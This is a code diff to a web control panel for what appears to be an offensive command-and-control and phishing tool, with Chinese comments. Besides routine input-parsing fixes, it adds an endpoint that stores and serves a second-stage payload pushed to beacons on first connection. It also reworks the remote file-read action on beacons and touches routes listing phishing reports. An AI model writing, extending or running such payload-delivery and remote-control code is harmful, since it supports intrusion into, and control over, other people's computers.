@@ -16,6 +16,17 @@ from flowscan.config import load_yaml
 from ._common import _to_bool, login_required
 
 
+def _safe_int_arg(name: str, default: int = 100) -> int:
+    """安全读取 int 查询参数(2026-09-04 B15): ?limit=abc 此前直接 500。"""
+    raw = request.args.get(name)
+    if raw is None:
+        return default
+    try:
+        return int(raw)
+    except (TypeError, ValueError):
+        return default
+
+
 def _c2_config(config: Dict[str, Any]) -> Dict[str, Any]:
     cfg = config.get("c2", {}) or {}
     return {
@@ -330,6 +341,26 @@ def register(app):
         _c2_audit(redis, f"unhide beacon {client_id}", "ok")
         return jsonify({"ok": True, "hidden": False})
 
+    @app.route("/api/c2/stage2", methods=["GET", "POST"])
+    @login_required
+    def c2_stage2():
+        """GET: 当前二阶段载荷源码(明文); POST {code}: 保存(首连下发, 立即生效)。"""
+        config = load_yaml(app.config["CONFIG_PATH"])
+        c2cfg = _c2_config(config)
+        if not c2cfg["enabled"]:
+            return jsonify({"ok": False, "error": "C2 未启用"}), 400
+        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
+        if request.method == "GET":
+            return jsonify({"ok": True, "code": c2_bridge.get_stage2()})
+        data = request.get_json(silent=True) or {}
+        code = data.get("code", "")
+        if not isinstance(code, str):
+            return jsonify({"ok": False, "error": "code 必须为字符串"}), 400
+        res = c2_bridge.set_stage2(code)
+        _c2_audit(app.config["get_redis"](),
+                  f"save stage2 ({len(code)} bytes)", "ok" if res.get("ok") else "err")
+        return jsonify(res)
+
     @app.route("/api/c2/hidden")
     @login_required
     def c2_hidden():
@@ -408,12 +439,14 @@ def register(app):
             return jsonify({"ok": False,
                             "error": "参数不完整(action/beacon_id/path)"}), 400
         if action == "read":
-            ok, msg = c2_bridge.exec_module_to_beacon(
+            # 返回 task_id,前端按 task_id 精确匹配回传结果(此前用
+            # "下发前结果数 before_count"作基准,对 dict 用 getattr 恒取
+            # None → before 恒 0,beacon 有历史结果时前端把旧结果当文件
+            # 内容;且结果窗口滑动时计数对比失真——2026-09-04 修复)
+            ok, task, msg = c2_bridge.exec_module_task(
                 bid, "edit", [path, "", "0"])
-            rec = c2_bridge.get_beacon(bid)
-            before = len(getattr(rec, "results", None) or []) if rec else 0
             return jsonify({"ok": ok, "message": msg,
-                            "before_count": before})
+                            "task_id": task.task_id if (ok and task) else ""})
         # write: 内容 base64 后走 edit 模块写模式(整文件替换)
         import base64 as _b64
         content = str(data.get("content", "") or "")
@@ -673,7 +706,7 @@ def register(app):
     @login_required
     def c2_audit():
         redis = app.config["get_redis"]()
-        limit = min(int(request.args.get("limit", "100") or 100), 500)
+        limit = min(_safe_int_arg("limit", 100), 500)
         raw = redis.conn.lrange("fs3:c2:audit", 0, limit - 1)
         entries = []
         for x in raw:
@@ -1030,7 +1063,7 @@ def register(app):
     def phishing_reports():
         if not _ensure_phishing():
             return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
-        limit = min(int(request.args.get("limit", "100") or 100), 500)
+        limit = min(_safe_int_arg("limit", 100), 500)
         reports = phishing_bridge.list_reports(limit)
         return jsonify({"ok": True, "count": len(reports), "reports": reports})
 
@@ -1047,7 +1080,7 @@ def register(app):
     @login_required
     def phishing_audit():
         redis = app.config["get_redis"]()
-        limit = min(int(request.args.get("limit", "100") or 100), 500)
+        limit = min(_safe_int_arg("limit", 100), 500)
         raw = redis.conn.lrange("fs3:phishing:audit", 0, limit - 1)
         entries = []
         for x in raw:
@@ -1189,7 +1222,7 @@ def register(app):
         start_sh = _export_start_sh()
 
         buf = io.BytesIO()
-        skip_dirs = {"__pycache__", ".git", "data"}
+        skip_dirs = {"__pycache__", ".git", "data", "downloads"}
         skip_files = {"events.jsonl", "server.log", "console.log"}
         with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
             for dirpath, dirnames, filenames in os.walk(root):
